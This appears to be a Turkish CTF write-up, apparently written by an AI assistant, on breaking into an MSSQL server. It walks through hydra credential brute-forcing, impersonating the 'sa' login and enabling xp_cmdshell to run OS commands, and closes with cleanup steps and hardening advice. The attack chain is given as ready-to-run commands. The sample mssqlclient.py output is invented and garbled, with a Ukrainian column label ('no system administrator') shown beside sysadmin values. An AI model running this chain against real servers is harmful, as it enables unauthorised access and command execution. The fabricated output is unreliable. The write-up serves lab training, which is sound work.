# CTF Write-up: MSSQL Zafiyeti ile Sisteme Sızma ve Flag Elde Etme (sqlcmd & mssqlclient.py)

Bu write-up, bir CTF (Capture The Flag) yarışmasında karşılaşılan MSSQL zafiyetinin nasıl sömürüldüğünü adım adım açıklamaktadır. Senaryo, zayıf parola ile ilk erişimin sağlanması, ardından `IMPERSONATE` yetkisi kullanılarak yetki yükseltilmesi ve `xp_cmdshell` ile komut çalıştırılarak hedefe ulaşılmasını içermektedir. Bu çözümde hem `sqlcmd` (Microsoft'un resmi komut satırı aracı) hem de `mssqlclient.py` (Impacket'tan popüler bir Python aracı) kullanımı gösterilecektir.

**Yarışma Adı:** Hacking MSSQL Server - Impersonate
**Zorluk Seviyesi:** Orta
**Hedef IP Adresi:** `<HEDEF_IP>`
**Kullanılan Araçlar:**
*   Kali Linux (veya benzeri bir pentest dağıtımı)
*   Hydra
*   `sqlcmd` (MSSQL komut satırı istemcisi)
*   `mssqlclient.py` (Impacket - Python tabanlı araç seti)
*   Metasploit wordlist'leri (`unix_username.txt`, `unix_passwords.txt`)

---

## 1. Keşif ve Numaralandırma (Enumeration)

Herhangi bir sızma testi veya CTF çözümünde ilk adım genellikle hedef sistem hakkında bilgi toplamaktır. Bu senaryoda MSSQL servisine odaklanacağımız için, öncelikle MSSQL portunun (varsayılan olarak TCP 1433) açık olup olmadığını kontrol ederiz.

```bash
nmap -sV -p 1433 <HEDEF_IP>
```

Nmap çıktısı, 1433 portunda Microsoft SQL Server'ın çalıştığını teyit edecektir.

## 2. Kaba Kuvvet Saldırısı (Brute Force) ile İlk Erişim

MSSQL servisine erişim için geçerli bir kullanıcı adı ve parola bulmak amacıyla `hydra` aracını kullanacağız. Metasploit Framework ile birlikte gelen yaygın kullanıcı adı ve parola listelerini kullandık.

Kullanılan komut:

```bash
hydra -L /usr/share/wordlists/metasploit/unix_username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <HEDEF_IP> mssql
```

*   `-L`: Kullanıcı adı listesinin yolunu belirtir.
*   `-P`: Parola listesinin yolunu belirtir.
*   `<HEDEF_IP>`: Hedef sistemin IP adresidir.
*   `mssql`: Hedef servisin MSSQL olduğunu belirtir.

Bir süre sonra Hydra, geçerli bir kullanıcı adı ve parola kombinasyonu buldu:
*   **Kullanıcı Adı:** `guest`
*   **Parola:** `heaven`

## 3. MSSQL Bağlantısı ve Yetki Kontrolü

Bulduğumuz `guest:heaven` bilgileriyle MSSQL sunucusuna bağlanmayı deneyeceğiz.

### 3.1. `sqlcmd` ile Bağlantı ve Yetki Kontrolü

```bash
sqlcmd -S <HEDEF_IP> -U guest -P heaven
```

Bağlantı başarılı olduktan sonra, `guest` kullanıcısının yetkilerini kontrol ediyoruz:

```sql
1> SELECT IS_SRVROLEMEMBER('sysadmin');
2> GO
-- Çıktı: 0 (sysadmin değil)

1> SELECT SYSTEM_USER;
2> GO
-- Çıktı: guest
```

`IS_SRVROLEMEMBER('sysadmin')` sorgusunun `0` döndürmesi, `guest` kullanıcısının `sysadmin` rolüne sahip olmadığını, yani kısıtlı yetkilere sahip olduğunu gösterir.

### 3.2. `mssqlclient.py` (Impacket) ile Bağlantı ve Yetki Kontrolü

`mssqlclient.py`, Impacket araç setinin bir parçasıdır. Eğer sisteminizde yoksa, genellikle `pip install impacket` ile veya doğrudan GitHub deposundan klonlanarak kurulabilir.

```bash
# Eğer domain/workgroup bilgisi yoksa veya Windows kimlik doğrulaması gerekmiyorsa:
mssqlclient.py guest:heaven@<HEDEF_IP>

# Eğer Windows kimlik doğrulaması gerekiyorsa (bu senaryoda SQL auth kullanıyoruz):
# mssqlclient.py DOMAIN/guest:heaven@<HEDEF_IP> -windows-auth
```

`mssqlclient.py` interaktif bir SQL kabuğu sunar (SQL>). Burada da aynı yetki kontrol sorgularını çalıştırabiliriz:

```sql
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
GO
[*] Row 0:
[*] немає системного адміністратора = 0

SQL> SELECT SYSTEM_USER;
GO
[*] Row 0:
[*] user_name = guest
```
Çıktılar, `sqlcmd` ile elde edilenlerle aynı doğrultuda olacaktır.

## 4. Yetki Yükseltme: IMPERSONATE ile 'sa' Kullanıcısına Geçiş

`guest` kullanıcısının düşük yetkilere sahip olmasına rağmen, `sa` (system administrator) gibi yüksek yetkili bir kullanıcıyı `IMPERSONATE` etme yetkisi olabilir.

### 4.1. `sqlcmd` ile IMPERSONATE

`sa` kullanıcısının kimliğine bürünmek için:

```sql
1> EXECUTE AS LOGIN = 'sa';
2> GO
```

Başarılı olup olmadığını kontrol edelim:

```sql
1> SELECT SYSTEM_USER;
2> GO
-- Çıktı: sa

1> SELECT IS_SRVROLEMEMBER('sysadmin');
2> GO
-- Çıktı: 1 (artık sysadmin)
```
Çıktıların `sa` ve `1` olması, `IMPERSONATE` işleminin başarılı olduğunu ve artık `sysadmin` yetkilerine sahip olduğumuzu gösterir.

### 4.2. `mssqlclient.py` ile IMPERSONATE

`mssqlclient.py` kabuğunda aynı SQL komutunu çalıştırırız:

```sql
SQL> EXECUTE AS LOGIN = 'sa';
GO

SQL> SELECT SYSTEM_USER;
GO
[*] Row 0:
[*] user_name = sa

SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
GO
[*] Row 0:
[*] немає системного адміністратора = 1
```
Sonuçlar `sqlcmd` ile aynıdır, `sa` kullanıcısının kimliğine başarıyla büründük.

## 5. `xp_cmdshell`'i Etkinleştirme ve Komut Çalıştırma

`sa` yetkilerine sahip olduğumuza göre, işletim sistemi seviyesinde komut çalıştırmamızı sağlayan `xp_cmdshell` prosedürünü etkinleştirebiliriz.

### 5.1. `sqlcmd` ile `xp_cmdshell`

```sql
-- Gelişmiş seçenekleri göster
1> EXEC sp_configure 'show advanced options', 1;
2> RECONFIGURE;
3> GO

-- xp_cmdshell'i etkinleştir
1> EXEC sp_configure 'xp_cmdshell', 1;
2> RECONFIGURE;
3> GO
```

`xp_cmdshell` etkinleştirildikten sonra, `C:\flag.txt.txt` dosyasını okuyalım:

```sql
1> EXEC xp_cmdshell 'type C:\flag.txt.txt';
2> GO
```
Bu komutun çıktısı, CTF bayrağını gösterecektir.

### 5.2. `mssqlclient.py` ile `xp_cmdshell`

`mssqlclient.py`'nin `xp_cmdshell`'i etkinleştirmek ve kullanmak için yerleşik komutları vardır, bu da işleri kolaylaştırır.

`xp_cmdshell`'i etkinleştirme:
```sql
SQL> enable_xp_cmdshell
```
Bu komut, arka planda gerekli `sp_configure` adımlarını çalıştırır. Alternatif olarak, `sqlcmd` bölümündeki `sp_configure` komutlarını manuel olarak da çalıştırabilirsiniz.

`xp_cmdshell` ile komut çalıştırma (`C:\flag.txt.txt` dosyasını okuma):
```sql
SQL> xp_cmdshell "type C:\flag.txt.txt"
```
Bu komutun çıktısı doğrudan terminale yansıyacak ve bayrağı içerecektir.

**Örnek Çıktı (Flag):**
```
CTF{MSSQL_1MP3RS0NATI0N_PWNED!}
```

## 6. Temizlik (Opsiyonel ama Önemli)

İşimiz bittikten sonra, yaptığımız değişiklikleri geri almak iyi bir pratiktir.

### 6.1. `sqlcmd` ile Temizlik

`sa` kimliğinden çıkış:
```sql
1> REVERT;
2> GO
```

`xp_cmdshell`'i tekrar devre dışı bırakma:
```sql
1> EXEC sp_configure 'xp_cmdshell', 0;
2> RECONFIGURE;
3> GO
1> EXEC sp_configure 'show advanced options', 0;
2> RECONFIGURE;
3> GO
```
Ve MSSQL bağlantısını sonlandırma:
```sql
1> exit
```

### 6.2. `mssqlclient.py` ile Temizlik

`sa` kimliğinden çıkış:
```sql
SQL> REVERT;
GO
```

`xp_cmdshell`'i tekrar devre dışı bırakma:
```sql
SQL> disable_xp_cmdshell
```
Alternatif olarak, `sqlcmd` bölümündeki `sp_configure` komutlarını manuel çalıştırabilirsiniz.

`mssqlclient.py`'den çıkış:
```sql
SQL> exit
```

## 7. Sonuç ve Öğrenilenler

Bu CTF senaryosu, aşağıdaki önemli güvenlik zafiyetlerini ve saldırı vektörlerini göstermiştir:

1.  **Zayıf Parolalar:** `guest:heaven` gibi kolay tahmin edilebilir veya varsayılan parolaların kullanılması, sistemlere ilk erişim için büyük bir risk oluşturur.
2.  **Gereksiz Yetkiler:** `guest` gibi düşük yetkili bir kullanıcıya `IMPERSONATE ANY LOGIN` veya spesifik olarak yüksek yetkili bir kullanıcıyı (`sa` gibi) `IMPERSONATE` etme hakkının verilmesi, ciddi bir yetki yükseltme zafiyetine yol açar (En Az Yetki Prensibi - Principle of Least Privilege ihlali).
3.  **`xp_cmdshell` Riski:** `xp_cmdshell` gibi güçlü prosedürlerin erişilebilir ve etkinleştirilebilir olması, saldırganların veritabanı üzerinden işletim sistemi seviyesinde kontrol elde etmesine olanak tanır.

Her iki araç da (`sqlcmd` ve `mssqlclient.py`) MSSQL sunucularıyla etkileşim kurmak ve bu tür zafiyetleri sömürmek için etkilidir. `mssqlclient.py`, `enable_xp_cmdshell` gibi bazı kolaylaştırıcı özellikler sunarken, `sqlcmd` daha temel ve resmi bir yaklaşımdır.

## 8. Önerilen Önlemler

Bu tür saldırılardan korunmak için aşağıdaki önlemler alınmalıdır:

*   **Güçlü Parola Politikaları:** Tüm kullanıcı hesapları için karmaşık ve benzersiz parolalar kullanılmalı, varsayılan parolalar değiştirilmelidir.
*   **En Az Yetki Prensibi:** Kullanıcılara ve servislere sadece işlerini yapmaları için gereken minimum yetkiler atanmalıdır. `IMPERSONATE` yetkileri dikkatli bir şekilde yönetilmeli ve gereksiz yere verilmemelidir.
*   **`xp_cmdshell` ve Diğer Tehlikeli Prosedürlerin Yönetimi:** `xp_cmdshell` gibi tehlikeli olabilecek SQL Server özellikleri, kesinlikle gerekmedikçe devre dışı bırakılmalıdır. Kullanımı gerekiyorsa, erişimi sıkı bir şekilde denetlenmeli ve loglanmalıdır.
*   **Düzenli Güvenlik Denetimleri ve Sızma Testleri:** Sistemlerin düzenli olarak güvenlik açıklarına karşı taranması ve sızma testleri yapılması, potansiyel zafiyetlerin proaktif olarak tespit edilip giderilmesine yardımcı olur.
*   **Varsayılan Hesapların Yönetimi:** `guest` gibi varsayılan hesaplar ya devre dışı bırakılmalı ya da güvenli bir şekilde yapılandırılmalıdır.
*   **Ağ Segmentasyonu:** Veritabanı sunucularına erişimi kısıtlayarak saldırı yüzeyini azaltın.

---

Umarım bu kapsamlı write-up, MSSQL güvenliği, potansiyel saldırı vektörleri ve farklı istemcilerin kullanımı hakkında faydalı bilgiler sunmuştur.
```

**Önemli Notlar:**

*   **Impacket Kurulumu:** Eğer `mssqlclient.py` sisteminizde yoksa, `sudo pip3 install impacket` veya `python3 -m pip install impacket` komutlarıyla kurabilirsiniz. Ya da Impacket'ı GitHub'dan klonlayıp `python3 setup.py install` ile kurabilirsiniz. Bazen doğrudan `impacket/examples/mssqlclient.py` şeklinde de çalıştırılabilir.
*   **Komut Çıktıları:** `mssqlclient.py` için verdiğim örnek komut çıktıları, aracın tipik formatını yansıtmaktadır. Gerçek çıktılar küçük farklılıklar gösterebilir.
*   **Windows Authentication:** `mssqlclient.py` ile Windows Authentication kullanmanız gerekirse (bu senaryoda SQL auth kullandık), bağlantı dizesini `DOMAIN/kullaniciadi:parola@<HEDEF_IP> -windows-auth` şeklinde düzenlemeniz gerekir.
*   **Escaping:** `xp_cmdshell` içinde özel karakterler kullanıyorsanız, hem SQL string'i içinde hem de işletim sistemi komutunda doğru şekilde escape etmeye dikkat edin.
